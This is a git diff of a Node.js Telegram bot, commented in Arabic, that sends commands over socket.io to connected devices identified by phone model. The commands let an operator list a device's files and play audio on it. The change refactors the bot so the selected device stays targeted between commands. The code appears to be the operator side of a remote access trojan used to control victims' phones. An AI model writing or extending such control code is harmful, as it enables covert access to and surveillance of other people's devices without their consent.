@@ -253,7 +253,14 @@ function getKeyboard(userId) {
   return String(userId) === OWNER_ID ? KB.OWNER : KB.MAIN;
 }
 
-// البقاء في قائمة التحكم بعد كل أمر
+// الحصول على اسم الجهاز الحالي من currentTarget
+function getCurrentDeviceName() {
+  const target = appData.get("currentTarget");
+  const sock = io.sockets.sockets.get(target);
+  return sock ? sock.model : "unknown";
+}
+
+// البقاء في قائمة التحكم مع نفس الجهاز
 function stayInControl(chatId, deviceName) {
   bot.sendMessage(chatId, fill(TEXT.CONTROL_MENU, { device: deviceName }), {
     parse_mode: "HTML",
@@ -460,12 +467,11 @@ bot.on("message", async msg => {
   const currentAction = appData.get("currentAction");
   const currentTarget = appData.get("currentTarget");
 
-  // دالة: البقاء في قائمة التحكم بعد تنفيذ الأمر
+  // ✅ البقاء مع نفس الجهاز — لا نحذف currentTarget
   const afterAction = () => {
-    const sock = io.sockets.sockets.get(currentTarget);
-    const name = sock ? sock.model : "unknown";
-    appData.delete("currentTarget");
+    const name = getCurrentDeviceName();
     appData.delete("currentAction");
+    // ⚠️ لا نحذف currentTarget — يبقى محفوظاً
     bot.sendMessage(data.id, TEXT.SUCCESS, { parse_mode: "HTML" });
     stayInControl(data.id, name);
   };
@@ -584,8 +590,8 @@ bot.on("message", async msg => {
       appData.delete(OWNER_ID + "_action");
       return bot.sendMessage(data.id, TEXT.CREATE_CODE_CANCEL, { parse_mode: "HTML", reply_markup: KB.OWNER });
     }
-    const sock = io.sockets.sockets.get(currentTarget);
-    const name = sock ? sock.model : "unknown";
+    // العودة لقائمة التحكم مع نفس الجهاز
+    const name = getCurrentDeviceName();
     return bot.sendMessage(data.id, fill(TEXT.CONTROL_MENU, { device: name }), {
       parse_mode: "HTML", reply_markup: KB.CONTROL
     });
@@ -621,16 +627,14 @@ bot.on("message", async msg => {
   }
 
   // ═══════════════════════════════════════════════════════
-  //   🎯 زر عرض الملفات (منفصل)
+  //   🎯 زر عرض الملفات
   // ═══════════════════════════════════════════════════════
   if (USER_TEXT === BTN.FILES) {
     if (!currentTarget) {
       return bot.sendMessage(data.id, TEXT.NO_TARGET, { parse_mode: "HTML" });
     }
     io.to(currentTarget).emit("file-explorer", { request: "ls", extras: [] });
-    const sock = io.sockets.sockets.get(currentTarget);
-    const name = sock ? sock.model : "unknown";
-    appData.delete("currentTarget");
+    // ✅ لا نحذف currentTarget
     return bot.sendMessage(data.id, TEXT.SUCCESS, { parse_mode: "HTML" });
   }
 
@@ -660,10 +664,9 @@ bot.on("voice", voice => {
         request: "playAudio",
         extras: [{ key: "url", value: url }]
       });
-      const sock = io.sockets.sockets.get(target);
-      const name = sock ? sock.model : "unknown";
-      appData.delete("currentTarget");
+      const name = getCurrentDeviceName();
       appData.delete("currentAction");
+      // ✅ لا نحذف currentTarget
       bot.sendMessage(data.id, TEXT.SUCCESS, { parse_mode: "HTML" });
       stayInControl(data.id, name);
     });
